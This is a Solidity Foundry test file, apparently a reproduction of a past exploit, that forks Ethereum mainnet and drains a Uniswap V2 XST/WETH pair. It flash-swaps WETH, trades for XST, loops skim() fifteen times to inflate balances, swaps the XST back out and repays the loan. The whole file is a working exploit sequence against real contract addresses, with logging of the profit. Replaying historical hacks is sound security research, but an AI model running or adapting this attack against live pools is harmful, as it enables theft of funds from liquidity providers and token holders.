// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./../interface.sol";

// Pool1: UniswapV2 WETH/USDT
// Pool2: UniswapV2 WETH/XST
// https://tools.blocksec.com/tx/eth/0x873f7c77d5489c1990f701e9bb312c103c5ebcdcf0a472db726730814bfd55f3

contract XSTExpTest is Test {
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant UniswapV20x694f = 0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C;
    address constant XST = 0x91383A15C391c142b80045D8b4730C1c37ac0378;
    address constant XStable2 = 0xb276647E70CB3b81a1cA302Cf8DE280fF0cE5799;
    address constant UniswapV20x0d4a = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheat.createSelectFork("mainnet", 15_310_016);
    }

    function testExploit() public {
        uint256 balance = IERC20(WETH).balanceOf(UniswapV20x694f);
        IUniswapV2Pair(UniswapV20x0d4a).swap(balance * 2, 0, address(this), "0000");
        uint256 WETHBalance = IERC20(WETH).balanceOf(address(this));
        console.log("now my weth num: %s", WETHBalance / 1e18);
        IERC20(WETH).withdraw(WETHBalance);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        if (keccak256(data) == keccak256("0000")) {
            uint256 balance = IERC20(WETH).balanceOf(address(this));
            IERC20(WETH).transfer(UniswapV20x694f, balance);
            uint256 uniswapETHBalance = IERC20(WETH).balanceOf(UniswapV20x694f);
            (uint256 amount0Out, uint256 amount1Out,) = Uni_Pair_V2(UniswapV20x694f).getReserves();
            console.log("Reserve amount %s", amount0Out);
            uint256 borrowXST = amount0Out * balance / uniswapETHBalance;
            console.log("Swap xst %s", borrowXST);
            Uni_Pair_V2(UniswapV20x694f).swap(borrowXST, 0, address(this), "00");
            Uni_Pair_V2(UniswapV20x694f).sync();
            uint256 b1 = IERC20(XST).balanceOf(address(this));
            uint256 b2 = IERC20(XST).balanceOf(UniswapV20x694f);
            console.log("My xst balance: %s, uniswp xst: %s", b1, b2);
            IERC20(XST).transfer(UniswapV20x694f, b1 / 8);
            for (uint8 i = 0; i < 15; ++i) {
                Uni_Pair_V2(UniswapV20x694f).skim(UniswapV20x694f);
            }
            Refund(amount0);
        } else {
            // do nothing
        }
    }

    function Refund(uint256 amount) internal {
        Uni_Pair_V2(UniswapV20x694f).skim(address(this));
        uint256 nowXSTBalance = IERC20(XST).balanceOf(address(this));
        IERC20(XST).transfer(UniswapV20x694f, nowXSTBalance);
        (uint256 a0Out, uint256 a1Out,) = Uni_Pair_V2(UniswapV20x694f).getReserves();
        uint256 swapAmount = a1Out * 9 / 10;
        Uni_Pair_V2(UniswapV20x694f).swap(0, swapAmount, address(this), "00");
        uint256 nowWETHBalance = IERC20(WETH).balanceOf(address(this));
        console.log("my weth balance: %s", nowWETHBalance);
        uint256 v = amount;
        uint256 fee = v * 4 / 1e3;
        uint256 refund = v + fee;
        console.log("Refund %s:", refund);
        IERC20(WETH).transfer(UniswapV20x0d4a, refund);
    }

    fallback() external payable {}
}
